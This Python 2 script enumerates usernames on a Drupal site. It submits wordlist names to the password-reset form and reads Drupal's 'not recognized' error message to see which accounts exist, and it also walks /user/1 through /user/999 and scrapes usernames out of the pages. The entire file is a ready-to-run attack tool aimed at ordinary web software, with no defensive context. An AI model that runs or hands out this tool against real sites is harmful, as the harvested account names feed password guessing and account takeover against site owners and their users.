#!/bin/python
# coding: utf-8

# to use it:
# python enum-users.py -u http://127.0.0.1 -w wordlist.txt --auto --verbose

import requests
from bs4 import BeautifulSoup
import sys
from optparse import OptionParser
import re

VERBOSE_MODE = False


def display_message(s):
    global VERBOSE_MODE
    if VERBOSE_MODE:
        print '[verbose] %s' % s


def main():
    global VERBOSE_MODE
    parser = OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL of the Drupal install", default=None)
    parser.add_option("-w", "--wordlist", dest="wordlist", help="wordlist you want to try", default=None)
    parser.add_option("-a", "--auto", action="store_true", dest="auto", help="Automatic method to enumerate users", default=None)
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Verbose mode")

    (options, args) = parser.parse_args()

    if options.verbose:
        VERBOSE_MODE = True

    if not options.url or (not options.wordlist and not options.auto):
        print parser.print_help()
        sys.exit(-1)

    if (options.wordlist):
        # url to target
        url = "%s/user/password" % options.url

        # load the usernames to enumerate
        with open(options.wordlist) as f:
            usernames = f.readlines()

        for username in usernames:
            username = username.rstrip()
            display_message("Trying %s" % username)
            # get form id
            req = requests.get(url)
            soup = BeautifulSoup(req.content)
            # get form
            form = soup.find('form', attrs={'id': 'user-pass'})
            form_build_id = form.find('input', attrs={'name': 'form_build_id'})['value']
            form_id = form.find('input', attrs={'name': 'form_id'})['value']
            op = form.find('input', attrs={'name': 'op'})['value']
            # send request
            data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username}
            req = requests.post(url, data=data)
            if ('is not recognized as a user name or an e-mail address.' in req.content):
                display_message("Username '%s' does not exist" % username)
            else:
                print "[!] Username '%s' exists" % username

    if (options.auto):
        # url to target
        url = "%s/user/" % options.url

        for i in range(1, 1000):
            tmp_url = "%s%s" % (url, i)
            display_message("Trying '%s'" % tmp_url)
            req = requests.get(tmp_url)

            try:
                username = re.search(r"/users/([a-zA-Z0-9-/.!?]+)", req.content).group(1)
                print "[!] Username '%s' found" % username
            except:
                pass

if __name__ == '__main__':
    main()
